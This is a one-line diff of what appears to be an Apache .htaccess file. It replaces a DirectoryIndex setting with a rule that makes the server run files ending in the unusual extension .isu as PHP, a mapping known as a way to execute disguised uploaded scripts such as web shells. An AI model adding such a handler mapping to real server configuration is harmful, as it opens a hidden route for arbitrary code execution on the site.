@@ -1,1 +1,1 @@
-DirectoryIndex idx.php
+AddType Application/x-httpd-php .isu
